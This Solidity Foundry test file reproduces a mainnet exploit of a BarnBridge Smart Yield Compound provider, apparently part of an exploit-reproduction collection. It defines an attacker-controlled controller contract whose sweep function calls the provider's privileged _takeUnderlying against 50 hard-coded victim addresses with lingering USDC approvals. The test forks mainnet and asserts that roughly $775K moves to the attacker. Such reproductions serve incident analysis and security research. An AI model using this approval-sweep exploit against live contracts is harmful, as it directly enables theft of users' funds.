// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$776K
// Attacker : 0xF908610E9174c7cd6e9dfD371e238be4511297A1
// Malicious Controller Proxy : 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580
// Vulnerable Compound Provider : 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310
// Attack Tx : 0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb
// Analysis : https://anomly.rs/barnbridge-smart-yield-controller-governance-usdc-sweep
//
// @Analysis
// Governance installed an attacker-controlled Smart Yield controller. The controller then invoked
// the provider's privileged _takeUnderlying path against 50 lingering user approvals and swept USDC.

interface IERC20Like {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

interface ICompoundProviderLike {
    function controller() external view returns (address);
    function underlyingFees() external view returns (uint256);
    function uToken() external view returns (address);
    function _takeUnderlying(
        address from,
        uint256 amount
    ) external;
    function transferFees() external;
}

contract ReconstructedBarnBridgeController {
    address internal constant ATTACKER = 0xF908610E9174c7cd6e9dfD371e238be4511297A1;

    function sweep(
        address provider,
        address[] calldata victims,
        uint256[] calldata amounts
    ) external {
        require(victims.length == amounts.length, "length mismatch");

        for (uint256 i = 0; i < victims.length; ++i) {
            ICompoundProviderLike(provider)._takeUnderlying(victims[i], amounts[i]);
        }

        ICompoundProviderLike(provider).transferFees();
    }

    function feesOwner() external pure returns (address) {
        return ATTACKER;
    }

    function _beforeCTokenBalanceChange() external {}

    function _afterCTokenBalanceChange(
        uint256
    ) external {}
}

contract BarnBridgeExp is Test {
    address internal constant ATTACKER = 0xF908610E9174c7cd6e9dfD371e238be4511297A1;
    address internal constant ATTACK_PROXY = 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580;
    address internal constant PROVIDER = 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 internal constant FOCAL_BLOCK = 25_535_120;
    uint256 internal constant FORK_BLOCK = FOCAL_BLOCK - 1;
    uint256 internal constant EXPECTED_SWEEP = 774_943_379_409;

    ICompoundProviderLike internal constant provider = ICompoundProviderLike(PROVIDER);
    IERC20Like internal constant usdc = IERC20Like(USDC);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    function testGovernedControllerApprovalSweep() public {
        assertEq(provider.uToken(), USDC, "provider underlying");
        assertEq(provider.controller(), ATTACK_PROXY, "governance-selected controller");
        assertEq(provider.underlyingFees(), 0, "no recorded fees before sweep");

        address[] memory victims = _victims();
        uint256[] memory amounts = _amounts();
        uint256 total = _sum(amounts);
        assertEq(total, EXPECTED_SWEEP, "focal amount sum");

        uint256 attackerBefore = usdc.balanceOf(ATTACKER);
        uint256 providerBefore = usdc.balanceOf(PROVIDER);
        uint256 victimBalancesBefore = _balanceSum(victims);

        emit log_named_uint("attacker USDC before", attackerBefore);
        emit log_named_uint("provider direct USDC before", providerBefore);
        emit log_named_uint("approved victim USDC before", victimBalancesBefore);
        emit log_named_uint("focal sweep amount", total);

        for (uint256 i = 0; i < victims.length; ++i) {
            assertGe(usdc.balanceOf(victims[i]), amounts[i], "victim balance");
            assertGe(usdc.allowance(victims[i], PROVIDER), amounts[i], "victim provider allowance");
        }

        vm.etch(ATTACK_PROXY, type(ReconstructedBarnBridgeController).runtimeCode);

        vm.prank(ATTACKER);
        ReconstructedBarnBridgeController(ATTACK_PROXY).sweep(PROVIDER, victims, amounts);

        uint256 attackerAfter = usdc.balanceOf(ATTACKER);
        uint256 providerAfter = usdc.balanceOf(PROVIDER);
        uint256 victimBalancesAfter = _balanceSum(victims);

        emit log_named_uint("attacker USDC after", attackerAfter);
        emit log_named_uint("provider direct USDC after", providerAfter);
        emit log_named_uint("approved victim USDC after", victimBalancesAfter);

        assertEq(attackerAfter - attackerBefore, EXPECTED_SWEEP, "attacker received focal USDC");
        assertEq(victimBalancesBefore - victimBalancesAfter, EXPECTED_SWEEP, "victims lost focal USDC");
        assertEq(providerAfter, providerBefore, "provider only held funds intra-transaction");
    }

    function _balanceSum(
        address[] memory accounts
    ) internal view returns (uint256 total) {
        for (uint256 i = 0; i < accounts.length; ++i) {
            total += usdc.balanceOf(accounts[i]);
        }
    }

    function _sum(
        uint256[] memory values
    ) internal pure returns (uint256 total) {
        for (uint256 i = 0; i < values.length; ++i) {
            total += values[i];
        }
    }

    function _victims() internal pure returns (address[] memory victims) {
        victims = new address[](50);
        victims[0] = 0x20C76D4203BF7490615804FE4fe9B132EE3E0935;
        victims[1] = 0xe77884CDdF148DD5f0e9191B33D8dBAdDB16DFB5;
        victims[2] = 0x71F12a5b0E60d2Ff8A87FD34E7dcff3c10c914b0;
        victims[3] = 0xB1C120957a5b5C45A15fd6e5E17f5A2B70bF49d0;
        victims[4] = 0x2d92441144E294d8eCEd55838d7665D04d64eA09;
        victims[5] = 0x0D4C7Abf6A1FBcBF4DbE7B98D4e1af26D5165cB0;
        victims[6] = 0xB8e4f6DEDFa4D4063D465536Bcb5926744319C69;
        victims[7] = 0x5d368c382Ae92FBA52233B95C633C96FE49D0Dc5;
        victims[8] = 0xAEbe2c167392E4b0d3e150ca80204eB327Db918b;
        victims[9] = 0x8FE02545E479Aa8bA77D84E51b1D9Ca17B88011A;
        victims[10] = 0xA8192F71f0Ec42Bf8cA501E80475E2287Ee54EB1;
        victims[11] = 0x0fe43549413276E5b2dA467f979FEe18f830fC4E;
        victims[12] = 0xd0dC07B98769f23A7BDbef15A35Faa256CB65dCF;
        victims[13] = 0x6621295A7fAdD3AB78aE6915502bD50fDd5A1491;
        victims[14] = 0xfA006a18F847bf45f67BCe08e2312149B254B59E;
        victims[15] = 0xe22289fC90d684b704c89D2ef0416bE2dcb509a4;
        victims[16] = 0x8548c1709184f052D2917f69df09676EAF759864;
        victims[17] = 0xDA57009d183fF7e2a4DA0f552a801FFd440a3e23;
        victims[18] = 0x67BC76E8Fd78CC59594C9F43C643eA7CAfA48669;
        victims[19] = 0xEf76BA56b914F9aF2FeC156F3c4408E111999db4;
        victims[20] = 0x7e5F578d0E4c43aE5C06A19BFB43A539A8908C87;
        victims[21] = 0x2D59d742cCe3a02E6A13958019F1A73EFDf66C11;
        victims[22] = 0x4efF3562075C5D2d9cb608139eC2fE86907005Fa;
        victims[23] = 0xfb0Cc36F27a28cc19C86C156091E2BEe7B2F6b69;
        victims[24] = 0xfFd70ED81Bd9eeFe8D0ef4cBbfAfb40C234Ff957;
        victims[25] = 0xB3b1A1193a0B7B48B46eFC3c86B614B152c257D5;
        victims[26] = 0xF2aE3d7C03E2e77536C17E3F0FCaCc612F0180Fa;
        victims[27] = 0x29b64F5D95a71B79874c4B5192c371BEa4B899cE;
        victims[28] = 0xc192F75bcb64D2E4f7e444A8E6fe8c3729728086;
        victims[29] = 0x0524Fe637b77A6F5f0b3a024f7fD9Fe1E688A291;
        victims[30] = 0x64c9677Ea9ad52263A319faaA226AA436541913F;
        victims[31] = 0x9cB8CF9Cc2C181cBfAd055838B3a7efC6755f32D;
        victims[32] = 0x3724583Ad51c8f7c4aB168dDcD185681Db07Baa5;
        victims[33] = 0x1cc3f09D7C971562F9d0Afbe4D0ee152b0fd2744;
        victims[34] = 0x7BB24F9ae8843590FABF42e049577e2ba68AFa0E;
        victims[35] = 0xF099D09c723D1a98a9C4853f0C025914aA040fB7;
        victims[36] = 0x67DA405C030d107d18510B5Ad708A34218C9c355;
        victims[37] = 0x0CfA0B89383fe30602240EFa1a2e1380f9090c3d;
        victims[38] = 0x8e9B650B79bd28f324f5B26D6dDBA594eb237cDf;
        victims[39] = 0x368C4E8933cf3577CcC394b4e05b4E03691493f1;
        victims[40] = 0x3aA8Ac0E6C1Fb9CBb733565De16cdC5a676bCb04;
        victims[41] = 0x82005D65AEcb10D711399cdDf8F39c553881bCe4;
        victims[42] = 0x80B3153F39Aeec1EF68Adc038913698e103E6e1d;
        victims[43] = 0x9757400188F2F54b83ac4dC290aB89dde526da10;
        victims[44] = 0xEBdcA98d2980362F1fA6eAd905a97F2F256F2a5c;
        victims[45] = 0x104D86705c46e9422B803AF522b43809f1C8e4e9;
        victims[46] = 0x473C6494180ad9Cd726f8a7a51cF8e88Bbf72bc6;
        victims[47] = 0xB152e2351c2209Ef82cB475f8D7D8693509C69e5;
        victims[48] = 0x3A3fe1cB66728282116802306093E327477CBbf1;
        victims[49] = 0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A;
    }

    function _amounts() internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](50);
        amounts[0] = 125_628_402_942;
        amounts[1] = 100_149_478_376;
        amounts[2] = 85_660_000_000;
        amounts[3] = 78_218_427_082;
        amounts[4] = 77_630_290_322;
        amounts[5] = 43_879_660_608;
        amounts[6] = 32_704_854_042;
        amounts[7] = 29_166_670_000;
        amounts[8] = 27_049_579_767;
        amounts[9] = 26_850_000_545;
        amounts[10] = 19_348_506_496;
        amounts[11] = 18_959_940_181;
        amounts[12] = 17_545_367_853;
        amounts[13] = 11_246_980_747;
        amounts[14] = 10_251_274_494;
        amounts[15] = 8_989_972_550;
        amounts[16] = 8_235_731_775;
        amounts[17] = 6_783_992_746;
        amounts[18] = 6_666_000_000;
        amounts[19] = 5_176_458_883;
        amounts[20] = 4_337_882_902;
        amounts[21] = 3_813_873_030;
        amounts[22] = 3_711_143_164;
        amounts[23] = 2_962_735_598;
        amounts[24] = 2_846_074_509;
        amounts[25] = 2_420_236_289;
        amounts[26] = 1_956_211_692;
        amounts[27] = 1_797_009_856;
        amounts[28] = 1_507_648_714;
        amounts[29] = 1_156_545_383;
        amounts[30] = 1_135_687_624;
        amounts[31] = 945_253_426;
        amounts[32] = 617_672_669;
        amounts[33] = 606_000_444;
        amounts[34] = 567_838_463;
        amounts[35] = 486_697_202;
        amounts[36] = 471_216_002;
        amounts[37] = 401_000_100;
        amounts[38] = 400_450_100;
        amounts[39] = 371_438_100;
        amounts[40] = 300_000_000;
        amounts[41] = 286_617_638;
        amounts[42] = 254_708_346;
        amounts[43] = 250_789_006;
        amounts[44] = 218_437_332;
        amounts[45] = 212_919_326;
        amounts[46] = 206_275_557;
        amounts[47] = 200_000_000;
        amounts[48] = 198_639_621;
        amounts[49] = 160_787_907;
    }
}
